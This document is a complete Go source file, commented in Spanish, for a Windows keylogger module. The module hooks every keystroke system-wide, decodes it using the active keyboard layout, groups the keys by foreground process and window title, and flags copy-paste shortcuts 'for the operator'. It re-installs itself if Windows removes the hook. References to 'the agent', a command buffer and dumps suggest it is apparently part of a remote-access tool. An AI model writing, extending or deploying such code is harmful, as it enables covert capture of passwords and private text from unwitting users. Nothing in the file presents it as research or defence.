//go:build windows

package win32

import (
	"context"
	"fmt"
	"log/slog"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	whKeyboardLL  = 13
	wmKeyDown     = 0x0100
	wmSysKeyDown  = 0x0104
	wmQuit        = 0x0012
	hcAction      = 0
	cfUnicodeText = 13

	// foregroundPoll es el latido que mira qué ventana tiene el foco. Cada
	// cambio de proceso o de título abre una sesión nueva en el buffer.
	foregroundPoll = 500 * time.Millisecond

	// hookHealth comprueba el hook con menos frecuencia que el foco: montarlo
	// no es gratis y no hace falta mirarlo cada medio segundo.
	hookHealth = 3 * time.Second

	vkControl = 0x11
)

var (
	procSetWindowsHookExW        = user32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx      = user32.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx           = user32.NewProc("CallNextHookEx")
	procGetMessageW              = user32.NewProc("GetMessageW")
	procTranslateMessage         = user32.NewProc("TranslateMessage")
	procDispatchMessageW         = user32.NewProc("DispatchMessageW")
	procPostThreadMessageW       = user32.NewProc("PostThreadMessageW")
	procGetKeyboardState         = user32.NewProc("GetKeyboardState")
	procToUnicodeEx              = user32.NewProc("ToUnicodeEx")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")
	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
)

// KeyEvent es una pulsación capturada. IsSpecial marca las teclas que no
// producen texto; en ese caso el contenido está en Label.
type KeyEvent struct {
	Timestamp time.Time
	Vk        uint32
	Rune      rune
	IsSpecial bool
	Label     string
}

// WindowSession agrupa lo tecleado mientras una ventana tuvo el foco.
type WindowSession struct {
	StartedAt   time.Time
	ProcessName string
	WindowTitle string
	Events      []KeyEvent
}

// Sink recibe las sesiones y los eventos. La implementa el buffer de comandos;
// win32 no conoce a quien los guarda.
type Sink interface {
	StartSession(process, title string, at time.Time)
	Append(ev KeyEvent)
}

type point struct {
	X int32
	Y int32
}

type msg struct {
	Hwnd     uintptr
	Message  uint32
	WParam   uintptr
	LParam   uintptr
	Time     uint32
	Pt       point
	LPrivate uint32
}

type kbdllHookStruct struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

type windowInfo struct {
	process string
	title   string
}

// Keylogger mantiene el hook WH_KEYBOARD_LL y etiqueta cada tecla con la
// ventana que tenía el foco. El almacenamiento vive fuera: aquí solo se captura
// y se entrega al Sink.
type Keylogger struct {
	mu       sync.Mutex
	sink     Sink
	hook     uintptr
	threadID uint32
	layout   uintptr
	window   windowInfo
	running  bool
	wanted   bool
	done     chan struct{}
	cancel   context.CancelFunc
	wg       sync.WaitGroup
}

// Default es el keylogger que usa el agente.
var Default = &Keylogger{}

// hookProcRef mantiene viva la referencia del callback ante el GC.
var hookProcRef = windows.NewCallback(keyboardProc)

// SetSink enlaza el buffer que recibe los eventos. Se puede llamar antes o
// después de Start: el hook lee el sink en cada tecla.
func (k *Keylogger) SetSink(sink Sink) {
	k.mu.Lock()
	k.sink = sink
	k.mu.Unlock()
}

// keyboardProc corre en el hilo del message loop. No debe bloquear.
func keyboardProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode == hcAction && (wParam == wmKeyDown || wParam == wmSysKeyDown) {
		kb := (*kbdllHookStruct)(uintptrToPointer(lParam))
		Default.record(kb)
	}
	res, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return res
}

// record traduce la tecla y la entrega al buffer, ya marcada con su etiqueta.
func (k *Keylogger) record(kb *kbdllHookStruct) {
	k.mu.Lock()
	sink := k.sink
	k.mu.Unlock()
	if sink == nil {
		return
	}

	event := KeyEvent{Timestamp: time.Now().UTC(), Vk: kb.VkCode}

	if ctrlDown() {
		if label, ok := ctrlLabel(kb.VkCode); ok {
			event.IsSpecial = true
			event.Label = label
			sink.Append(event)
			return
		}
	}

	if label, ok := specialLabel(kb.VkCode); ok {
		event.IsSpecial = true
		event.Label = label
		sink.Append(event)
		return
	}

	// Shift, Alt y Ctrl sueltos no son texto: marcarlos llenaría el dump de
	// [VK:0x10] entre cada mayúscula. Se usan para construir las etiquetas.
	if isModifierKey(kb.VkCode) {
		return
	}

	if r, ok := k.decode(kb); ok && r != 0 {
		event.Rune = r
		sink.Append(event)
		return
	}

	event.IsSpecial = true
	event.Label = fmt.Sprintf("[VK:0x%02X]", kb.VkCode)
	sink.Append(event)
}

// decode convierte la tecla a rune con ToUnicodeEx y el layout de la ventana en
// foco: la misma posición de tecla da 'ñ' en español y 'z' en alemán.
func (k *Keylogger) decode(kb *kbdllHookStruct) (rune, bool) {
	var state [256]byte
	if res, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&state[0]))); res == 0 {
		return 0, false
	}

	k.mu.Lock()
	layout := k.layout
	k.mu.Unlock()

	var buf [8]uint16
	n, _, _ := procToUnicodeEx.Call(
		uintptr(kb.VkCode),
		uintptr(kb.ScanCode),
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,
		layout,
	)
	if int32(n) <= 0 {
		return 0, false
	}

	r := rune(buf[0])
	if utf16.IsSurrogate(r) && int(n) > 1 {
		r = utf16.DecodeRune(r, rune(buf[1]))
	}
	return r, true
}

// ctrlDown pregunta por el estado real del modificador en este instante.
func ctrlDown() bool {
	res, _, _ := procGetAsyncKeyState.Call(vkControl)
	return int32(res)&0x8000 != 0
}

// ctrlLabel cubre los atajos que interesan al operador.
func ctrlLabel(vk uint32) (string, bool) {
	switch vk {
	case 0x43:
		return "[CTRL+C]", true
	case 0x56:
		return "[CTRL+V]", true
	case 0x58:
		return "[CTRL+X]", true
	case 0x41:
		return "[CTRL+A]", true
	case 0x5A:
		return "[CTRL+Z]", true
	case 0x53:
		return "[CTRL+S]", true
	}
	return "", false
}

// specialLabel mapea las teclas que nunca producen texto.
func specialLabel(vk uint32) (string, bool) {
	switch vk {
	case 0x0D:
		return "[ENTER]", true
	case 0x09:
		return "[TAB]", true
	case 0x08:
		return "[BKSP]", true
	case 0x2E:
		return "[DEL]", true
	case 0x1B:
		return "[ESC]", true
	case 0x5B, 0x5C:
		return "[WIN]", true
	}
	if vk >= 0x70 && vk <= 0x7B {
		return fmt.Sprintf("[F%d]", vk-0x6F), true
	}
	return "", false
}

func isModifierKey(vk uint32) bool {
	switch vk {
	case 0x10, 0x11, 0x12, // Shift, Control, Alt
		0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, // izquierdas y derechas
		0x14: // CapsLock: cambia el estado, no escribe
		return true
	}
	return false
}

// Start instala el hook y el vigilante de ventana. Si ya está activo es no-op.
func (k *Keylogger) Start() error {
	k.mu.Lock()
	if k.running {
		k.wanted = true
		k.mu.Unlock()
		return nil
	}
	k.wanted = true
	ctx, cancel := context.WithCancel(context.Background())
	k.cancel = cancel
	k.mu.Unlock()

	k.wg.Add(1)
	go func() {
		defer k.wg.Done()
		k.watch(ctx)
	}()

	return k.install()
}

// Stop desinstala el hook y para el vigilante. No toca el buffer: lo que esté
// capturado sigue disponible para el próximo dump.
func (k *Keylogger) Stop() {
	k.mu.Lock()
	k.wanted = false
	cancel := k.cancel
	k.cancel = nil
	running, tid, done := k.running, k.threadID, k.done
	k.mu.Unlock()

	if cancel != nil {
		cancel()
	}

	if running && done != nil {
		procPostThreadMessageW.Call(uintptr(tid), wmQuit, 0, 0)
		select {
		case <-done:
		case <-time.After(2 * time.Second):
			slog.Debug("keylogger: el message loop no cerró a tiempo")
		}
	}

	// El vigilante sale solo al cancelar el contexto; se espera para no dejar
	// una goroutine viva por cada start/stop del panel.
	waited := make(chan struct{})
	go func() {
		k.wg.Wait()
		close(waited)
	}()
	select {
	case <-waited:
	case <-time.After(time.Second):
		slog.Debug("keylogger: el vigilante no cerró a tiempo")
	}
}

// Running informa si el hook está activo.
func (k *Keylogger) Running() bool {
	k.mu.Lock()
	defer k.mu.Unlock()
	return k.running
}

// watch hace dos cosas con un solo reloj: sigue la ventana en foco y rearma el
// hook si Windows lo retiró.
func (k *Keylogger) watch(ctx context.Context) {
	ticker := time.NewTicker(foregroundPoll)
	defer ticker.Stop()

	lastHealth := time.Time{}
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
		}

		k.syncForeground()

		if time.Since(lastHealth) < hookHealth {
			continue
		}
		lastHealth = time.Now()

		k.mu.Lock()
		wanted, running := k.wanted, k.running
		k.mu.Unlock()
		if wanted && !running {
			if err := k.install(); err != nil {
				slog.Debug("keylogger: rearme fallido", "err", err)
			}
		}
	}
}

// syncForeground lee la ventana activa y abre sesión cuando cambia. También
// refresca el layout del teclado que usa ToUnicodeEx.
func (k *Keylogger) syncForeground() {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return
	}

	var titleBuf [512]uint16
	var title string
	if n, _, _ := procGetWindowTextW.Call(
		hwnd,
		uintptr(unsafe.Pointer(&titleBuf[0])),
		uintptr(len(titleBuf)),
	); n > 0 && int(n) <= len(titleBuf) {
		title = string(utf16.Decode(titleBuf[:n]))
	}

	var pid uint32
	threadID, _, _ := procGetWindowThreadProcessID.Call(
		hwnd, uintptr(unsafe.Pointer(&pid)))

	process := ""
	if handle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid); err == nil {
		var path [windows.MAX_LONG_PATH]uint16
		size := uint32(len(path))
		if qerr := windows.QueryFullProcessImageName(handle, 0, &path[0], &size); qerr == nil && size > 0 {
			process = filepath.Base(windows.UTF16ToString(path[:size]))
		}
		_ = windows.CloseHandle(handle)
	}

	var layout uintptr
	if threadID != 0 {
		layout, _, _ = procGetKeyboardLayout.Call(threadID)
	}

	if process == "" && title == "" {
		return
	}

	k.mu.Lock()
	k.layout = layout
	changed := process != k.window.process || !sameWindowTitle(title, k.window.title)
	k.window = windowInfo{process: process, title: title}
	sink := k.sink
	k.mu.Unlock()

	if changed && sink != nil {
		sink.StartSession(process, title, time.Now().UTC())
	}
}

// sameWindowTitle compara títulos ignorando el asterisco de "sin guardar" que
// Notepad y otros ponen al primer carácter. Sin esto, escribir en un documento
// nuevo partía la sesión en dos mitades.
func sameWindowTitle(a, b string) bool {
	if a == b {
		return true
	}
	return strings.TrimPrefix(a, "*") == strings.TrimPrefix(b, "*")
}

// install monta el hook y corre el message loop hasta que alguien pide parar.
func (k *Keylogger) install() error {
	ready := make(chan error, 1)

	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		hook, _, callErr := procSetWindowsHookExW.Call(whKeyboardLL, hookProcRef, 0, 0)
		if hook == 0 {
			ready <- fmt.Errorf("keylogger: SetWindowsHookExW falló: %v", callErr)
			return
		}

		done := make(chan struct{})
		k.mu.Lock()
		k.hook = hook
		k.threadID = windows.GetCurrentThreadId()
		k.running = true
		k.done = done
		wanted := k.wanted
		k.mu.Unlock()

		ready <- nil

		// Un stop que llegó mientras se montaba el hook no puede quedar en
		// nada: se cierra el bucle recién abierto.
		if !wanted {
			procPostThreadMessageW.Call(uintptr(windows.GetCurrentThreadId()), wmQuit, 0, 0)
		}

		var m msg
		for {
			res, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&m)), 0, 0, 0)
			if int32(res) <= 0 {
				break
			}
			procTranslateMessage.Call(uintptr(unsafe.Pointer(&m)))
			procDispatchMessageW.Call(uintptr(unsafe.Pointer(&m)))
		}

		procUnhookWindowsHookEx.Call(hook)
		k.mu.Lock()
		k.running = false
		k.hook = 0
		k.threadID = 0
		k.mu.Unlock()
		close(done)
	}()

	return <-ready
}
